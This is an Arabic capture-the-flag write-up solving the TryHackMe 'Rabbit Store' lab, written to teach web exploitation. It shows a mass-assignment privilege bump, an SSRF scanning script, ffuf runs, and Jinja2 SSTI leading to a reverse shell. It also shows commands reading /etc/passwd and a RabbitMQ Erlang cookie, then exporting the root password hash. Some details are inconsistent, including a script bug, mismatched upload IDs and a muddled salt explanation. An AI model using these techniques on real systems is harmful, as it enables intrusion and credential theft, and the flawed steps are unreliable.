---
title: حل تحدي rabbitstore
date: 2025-04-30
categories: 'CTFs'
tags: ["SSTI","SSRF","THM"]
description: بسطة تبيع أرانب
image: https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1727807358043
---

# المقدمة
بسم الله الرحمن الرحيم، في هذا التحدي نبدأ من موقع ويب على مدخل 80 بعدين نعدل على التوكن عشان نصعد صلاحياتنا في الموقع، ثم نستغل ثغرة SSRF عشان نشوف مستندات ال api اللي من خلالها راح نكشف نقطة غريبة في الموقع واللي فيها ثغرة SSTI اللي نقدر من خلالها نحصل RCE على السيرفر، نلاحظ عندنا اسم مستخدم غريب على السيرفر برمز تعريف 124 بعد البحث نحصل الكوكيز اللي من خلالها نقدر نطلع كلمة المرور حقت الروت، لكن يحتاج نفك التشفير...

## موقع الويب | تصعيد الصلاحيات
بعد مانفحص المداخل على السيرفر نحصل مدخلين مفتوحة:
- 80 -> http
- 22 -> ssh
بعد مانضيف الهوست(cloudsite.thm) عندنا في ملف etc/hosts/ ودخلنا على موقع الويب تقابنا الصفحة ذي:
![main_page](/assets/img/rabbit_main.png)
إذا ضغطت على زر تسجيل الدخول راح يوجهك على سب دومين، ضيفه لل etc/hosts/ وخلينا نكمل:
![signup_page](/assets/img/rabbit_signup.png)
بعد مانسجل حساب وندخل عليه نلاحظ رسالة تقول أن ماعندنا صلاحيات، بعد البحث البسيط والتدقيق والملاحظة تنتبه أن عندك JWT token، خلينا نفك تشفيرها. باستخدم هذا الموقع [fusionauth](https://fusionauth.io/dev-tools/jwt-decoder)
```json
{
  "email": "ss@ss.sa",
  "subscription": "inactive",
  "iat": 1746008424,
  "exp": 1746012024
}
```
حاولت أعدل على خانة الاشتراك وأخليها active لكن الواضح أن السيرفر كل ماتعطيه التوكن يتأكد منها، لذلك تغييرك للقيم بشكل مباشر ماينفع وراح يعطيك خطأ Invalid Token. ليش ما نجرب mass assignment؟, وهي أحد الثغرات المشهورة في ال APIs وفكرتها إنك ترسل طلب للسيرفر بخانات إضافية ماهي موجودة في الطلب الرئيسي. خليني أستطرد، أنت يوم تسوي حساب على الموقع تلاحظ خانتين تنرسل للسيرفر:
![register_form](/assets/img/rabbit_regform.png)
خلينا نخمن - في النهاية هذا أساس الاختراق - السيرفر يخزن اسم المستخدم وكلمة المرور، لكن من التوكن نلاحظ قيمة ثالثة وهي subscription، خلينا نسوي حساب جديد لكن بدال ما نرسل قيمتين، خلينا نرسل ثلاثة - email,pass,subs -
![mass_assignment](/assets/img/rabbit_mass.png)
إذا شيكت ذحين على التوكن تلاحظ أن قيمة الاشتراك تغيرت!
```json
{
  "email": "a@a.b",
  "subscription": "active",
  "iat": 1746009500,
  "exp": 1746013100
}
```
ممتاز! خلينا نروح للصفحة الرئيسية ونشوف المحتوى:
![upload_form](/assets/img/rabbit_uploadform.png)
إذا رسلت رابط بالهوست المحلي ماراح يجيك خطأ، بعكس [londonbridge](http://localhost:4000/posts/thelondonbridge/)، خلينا نشوف الملفات الموجودة، هنا لازم أكتب سكربت عشان أأتمت الشغلة، لأن يوم ترسل طلب للسيرفر راح يرد عليك ب :
```json
{"message":"File stored from URL successfully","path":"/api/uploads/d7a46917-2370-420a-9e4e-f8a0da440e21"}
```
بعدين لازم تروح للعنوان حق الملف، هذا السكربت اللي كتبته:

```python

#!/usr/bin/python
import requests
import sys
import json
from concurrent.futures import ThreadPoolExecutor 

url = 'http://storage.cloudsite.thm'
token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFAYS5iIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQ2MDE0MDA2LCJleHAiOjE3NDYwMTc2MDZ9.vlEvdMsy6_RqGWVr9KnbOZuklIg0Of5Z7Z8bHCYx9hM'
cookies = {'jwt': token}
headers = {'Content-Type': 'application/json'}

def send_requests(line):
    line = line.strip()
    if not line:
        return
    data = {'url':f'http://localhost/{line}'}
    try:
        req1 = requests.post(f'{url}/api/store-url', cookies=cookies, data=json.dumps(data), headers=headers)
        req1.raise_for_status()
        local_file = req1.json()['path']
        req2 = requests.get(f'{url}/local_file', cookies=cookies)
        if not '404' in req2.text:
            print(f'path={local_file}')
    except Exception as e:
        print('[-] Error:', e)

with open(sys.argv[1], 'r') as file:
    paths = file.readlines()
with ThreadPoolExecutor(max_workers=20) as executer:
    executer.map(send_requests, paths)
```

مو أفضل سكربت لكن أتحسن مع الممارسة بإذن الله، المهم أنه مافي أي ملف يمدينا نوصل له من خلال SSRF، خلينا نروق شوية ونشوف الطرق اللي يمدينا نفحصها على الموقع، فيه طريق مثير وهو api/, خليني أستخدم ffuf عشان أشوف إيش الصفحات اللي تحته:

```bash
rabbitstore ffuf -u http://storage.cloudsite.thm/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFAYS5iIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQ2MDE0MDA2LCJleHAiOjE3NDYwMTc2MDZ9.vlEvdMsy6_RqGWVr9KnbOZuklIg0Of5Z7Z8bHCYx9hM"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://storage.cloudsite.thm/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Header           : Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFAYS5iIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQ2MDE0MDA2LCJleHAiOjE3NDYwMTc2MDZ9.vlEvdMsy6_RqGWVr9KnbOZuklIg0Of5Z7Z8bHCYx9hM
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 617ms]
register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 1360ms]
docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 461ms]
uploads                 [Status: 200, Size: 34828, Words: 1, Lines: 1, Duration: 1741ms]
Login                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 637ms]
```
عندنا 405 يعني الميثود غلط، ماهي مثيرة. المثير هو حبيب القلب 403 مايمدينا نوصل له بشكل مباشر، خلينا نشوف إذا يمدينا باستخدام SSRF:
```bash
➜  rabbitstore curl http://storage.cloudsite.thm/api/store-url -d '{"url":"http://localhost/api/docs"}' -H 'Content-Type: application/json' -H 'Cookie: jwt=TOKEN' 

{"message":"File stored from URL successfully","path":"/api/uploads/fa1558a4-bc30-492b-9dc5-a7b075da9d68"}

➜  rabbitstore curl http://storage.cloudsite.thm/api/uploads/fa1558a4-bc30-492b-9dc5-a7b075da9d68 -H 'Cookie: jwt=TOKEN'

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at cloudsite.thm Port 80</address>
</body></html>
```
## مستندات مخفية
غريبة، المفروض يمدينا نوصل للملفات بهذه الطريقة لأن اللي قاعد يرسل الطلب هو السيرفر نفسه!. خلينا نشوف المداخل الثانية، يمكن فيه سيرفر شغال محليا مايمدينا نرسل له طلبات من خارج الشبكة:
```bash
➜  rabbitstore ffuf -u http://storage.cloudsite.thm/api/store-url -d '{"url":"http://localhost:FUZZ/api/docs"}' -H 'Content-Type: application/json' -H 'Cookie: jwt=TOKEN' -w ports -fc 500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://storage.cloudsite.thm/api/store-url
 :: Wordlist         : FUZZ: /home/vulner/thm/rabbitstore/ports
 :: Header           : Cookie: jwt=TOKEN
 :: Header           : Content-Type: application/json
 :: Data             : {"url":"http://localhost:FUZZ/api/docs"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 500
________________________________________________

80                      [Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 182ms]
3000                    [Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 229ms]
8000                    [Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 276ms]
15672                   [Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 234ms]
```
عندنا كم نتيجة، المدخل اللي نبغاه هو 3000:
```bash
➜  rabbitstore curl http://storage.cloudsite.thm/api/store-url -d '{"url":"http://localhost:3000/api/docs"}' -H 'Content-Type: application/json' -H 'Cookie: jwt=TOKEN'

{"message":"File stored from URL successfully","path":"/api/uploads/00dd382b-b4bf-4bd4-b0f8-5a0c1210eabf"}

➜  rabbitstore curl http://storage.cloudsite.thm/api/uploads/00dd382b-b4bf-4bd4-b0f8-5a0c1210eabf -H 'Cookie: jwt=TOKEN'

Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format. # Important Detail, so you don't waste time!
```
كلها عادية ومرت علينا إلا وحدة وهي fetch_messages_from_chatbot خلينا نرسل لها طلب ونشوف:
```bash
➜  rabbitstore curl http://storage.cloudsite.thm/api/store-url -d '{"url":"http://localhost:3000/api/fetch_messeges_from_chatbot"}' -H 'Content-Type: application/json' -H 'Cookie: jwt=TOKEN'

{"message":"File stored from URL successfully","path":"/api/uploads/74102115-da3d-4da7-8a25-6b0ec6dd2238"}

➜  rabbitstore curl http://storage.cloudsite.thm/api/uploads/e4e43418-e1a6-4dd5-bc40-37bbc1f90e35 -H 'Cookie: jwt=TOKEN'
{"message":"Token not provided"}
```
النقطة تطلب منك التوكن لكن مايمديك ترسل التوكن من خلال ثغرة SSRF لأنها ماهي بارامتر وإنما header حتى لو قدرت ترسل التوكن راح ترسل طلب إحضار GET والنقطة تستقبل طلبات إرسال POST، خلينا نشوف مدخل 80:
```bash
➜  rabbitstore curl http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot -d '{"url":"ss"}' -H 'Content-Type: application/json' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFAYS5iIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQ2MDIyMzIwLCJleHAiOjE3NDYwMjU5MjB9.yXqvbimp58qQmN97QjFs2_aWel0WRTN0erOYVc9D_mQ'
{
  "error": "username parameter is required"
}
```
## SSTI
```bash
➜  rabbitstore curl http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot -d '{"username":"ss"}' -H 'Content-Type: application/json' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFAYS5iIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQ2MDIyMzIwLCJleHAiOjE3NDYwMjU5MjB9.yXqvbimp58qQmN97QjFs2_aWel0WRTN0erOYVc9D_mQ'

<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, ss, our chatbot server is currently under development.</h1>
 </body>
</html>
```
نلاحظ إذا غيرنا قيمة المستخدم يتغير معنا في رد السيرفر، خلينا نجرب SSTI
![burp_SSTI](/assets/img/rabbit_SSTI.png)
عندنا template engine jinja2 إذا بحثنا في قوقل عن [jijna2 SSTI to RCE](https://www.google.com/search?client=firefox-b-d&q=jijna2+SSTI+to+RCE) يطلع لنا مقال بعنوان [Server Side Template Injection with Jinja2 for you](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) يشرح فيه أن محرك القوالب jinja2 يسمح لك تنفذ دوال في بايثون من خلالها تقدر تنفذ أوامر على النظام، في الوقت الحالي خلينا ناخذ الحمولة حقته ونرسلها للسيرفر:

## RCE

![SSTI2RCE](/assets/img/rabbit_SSTI2RCE.png)
![reverseshell](/assets/img/rabbit_revsh.png)
![terminal](/assets/img/rabbit_terminal.png)
بعد ما ناخذ العلم من مجلد المستخدم، نحاول نصعد الصلاحيات. لكن الطرق التقليدية ماتنفع. عندنا اسم غريب في etc/passwd/:
```bash
azrael@forge:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
rabbitmq:x:124:131:RabbitMQ messaging server,,,:/var/lib/rabbitmq:/usr/sbin/nologin
```
في البداية ما شفته لكن بعد ماتشغل pspy64 تلاحظ حركة غريبة في السيرفر:
```bash
CMD: UID=124   PID=3665   | sh -c exec /bin/sh -s unix:cmd 
CMD: UID=124   PID=3666   | /bin/sh -s unix:cmd 
CMD: UID=124   PID=3667   | sh -c exec /bin/sh -s unix:cmd 
CMD: UID=124   PID=3668   | /bin/sh -s unix:cmd 
CMD: UID=124   PID=3669   | sh -c exec /bin/sh -s unix:cmd
CMD: UID=124   PID=3836   | /usr/bin/df -kP /var/lib/rabbitmq/mnesia/rabbit@forge
```
```bash
azrael@forge:/ cat /etc/passwd | grep 124

rabbitmq:x:124:131:RabbitMQ messaging server,,,:/var/lib/rabbitmq:/usr/sbin/nologin
```
إذا رحت للمجلد حق المستخدم تلاحظ فيه ملف باسم erlang.cookie.:
```bash
azrael@forge:/ cat /var/lib/rabbitmq/.erlang.cookie

xuCtFDnd9dbt8nT4
```
## استخدام خدمة rabbitmq
الآن عندي كم معلومة، الأولى هي اسم المستخدم، الثانية هي الكوكيز والواضح أنها تستخدم للتحقق من الهوية -Authentication-. إذا بحث في قوقل عن اسم المستخدم راح تطلع لك الصفحة حقت الخدمة [RabbitMQ](https://www.rabbitmq.com/) الآن أمامك طريقين، الأول إنك تبحث عن ثغرات معروفة في هذه الخدمة، جربت كذا سكربت لكن ماضبط معي أي واحد، الطريقة الثانية هي إنك تبحث عن طريقة تسجيل الدخول باستخدام الكوكيز اللي معك، إذا بحث في قوقل عن [authenticating to rabbitmq with erlangcookie](https://www.google.com/search?client=firefox-b-d&q=authenticating+to+rabbitmq+with+erlangcookie) تطلع معك صفحة بعنوان [Authentication, Authorisation, Access Control](https://www.rabbitmq.com/docs/access-control) نلاحظ في قسم listing_users عندنا ثنائية باسم rabbitmqctl، الواضح من خلالها نقدر نرسل طلبات للسيرفر، بعد مانبحث شوي نطلع هذي الصفحة [rabbitmqctl](https://www.rabbitmq.com/docs/man/rabbitmqctl.8) واللي تشرح طريقة استخدام الثنائية. بعد مانحمل الثنائية عندنا خلينا نحاول نرسل طلب للسيرفر:

```bash
$ ./rabbitmqctl --erlang-cookie xuCtFDnd9dbt8nT4 -n rabbit@cloudsite.thm list_users
Error: operation list_users failed due to invalid node name (node: rabbit@cloudsite.thm, reason: short).
If using FQDN node names, use the -l / --longnames argument
```
اسم النود غير صحيح، في المخرجات حقت pspy64 كان عندنا اسم غريب وهو rabbit@forge ممكن يكون هو اسم النود، لكن قبلها خلينا نضيف forge ل etc/hosts/:
```bash
./rabbitmqctl --erlang-cookie xuCtFDnd9dbt8nT4 -n rabbit@forge list_users 
Listing users ...
user	tags
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.	[]
root	[administrator]
```
الهدف الآن هو استخراج كلمة المرور الخاصة بالروت، إذا كملت بحث في مستندات الخدمة راح تحصل ذي الصفحة [Schema Definition Export and Import](https://www.rabbitmq.com/docs/definitions#export) اللي تشرح طريقة تخزين الخدمة للمعلومات، من خلال هذا الأمر تقدر تطلع الهاش حق الروت:
```bash
$ ./rabbitmqctl --erlang-cookie xuCtFDnd9dbt8nT4 --node rabbit@forge export_definitions ./def.json 
Exporting definitions in JSON to a file at "./def.json" ...
... 
"name" => "root", "password_hash" => "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF"
...
```
## فك الهاش وتصعيد الصلاحيات

الآن بعد ماصار الهاش معنا، لازم نعرف نتعامل معه، الرسالة اللي قبل شوي توصي بعدم محاولة كسره، خلينا نبحث في قوقل عن [RabbitMQ hashing algorithm](https://www.google.com/search?client=firefox-b-d&q=rabbitmq+hashing+algorithm) راح تطلع الصفحة [Credentials and Passwords](https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm)، من خلالها نعرف أن الهاش عبارة عن:

- كلمة المرور
- أضف عليها 4 بايت ملح
- يطلع لك هاش بدون طعم، أضف عليه 4 بايت ملح
- تشفير base64 

عشان نطلع كلمة المرور:

- فك تشفير base64 
- تحويل الناتج إلى هيكس
- إزالة الملح الزائد -8 بايت-

```bash
$ echo '49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF' | base64 -d | xxd -p 
e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed
194f98073585
```
الآن عندك كلمة المرور الخاصة بالروت، واجهتني مشكلة أثناء حلي للتحدي مقدر أشبك على اتصال عكسي، لكن أتوقع الباقي بسيط.